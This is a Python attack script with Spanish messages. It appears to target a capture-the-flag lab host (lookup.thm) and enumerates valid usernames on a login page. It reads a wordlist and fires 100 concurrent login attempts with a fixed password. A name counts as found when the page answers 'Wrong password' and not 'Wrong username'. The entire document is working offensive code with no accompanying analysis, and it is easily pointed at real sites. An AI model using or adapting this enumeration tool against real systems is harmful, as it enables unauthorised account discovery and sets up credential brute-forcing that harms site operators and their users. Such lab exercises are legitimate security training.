import requests
import sys
from concurrent.futures import ThreadPoolExecutor
def enviar_peticion(usuario):
    url = "http://lookup.thm/login.php"
    datos = {
                "username": usuario,
                "password": "test"
            }
    try:
        respuesta = requests.post(url,data=datos)
        if "Wrong password" in respuesta.text:
                print(f"Nombre de usuario encontrado: {usuario}")
        elif "Wrong username" in respuesta.text:
            pass
    except requests.RequestException as t:
        print(f"Error al realizar la solicitud: {t}")
def main():
    if len(sys.argv) != 2:
        print("Ejemplo de uso: script.py ruta/del/diccionario.txt")
        sys.exit(1)
    diccionario_ruta = sys.argv[1]

    try:
        with open(diccionario_ruta, "r") as diccionario:
            usuarios =[linea.strip() for linea in diccionario if linea.strip()]
        with ThreadPoolExecutor(max_workers=100) as ejecucion:
            ejecucion.map(enviar_peticion,usuarios)
    except FileNotFoundError:
            print(f"Archivo: {diccionario_ruta} no encontrado")
    except requests.ReadTimeout as b:
            print(f"Error en el requerimiento: {b}")
if __name__== "__main__":
            main()
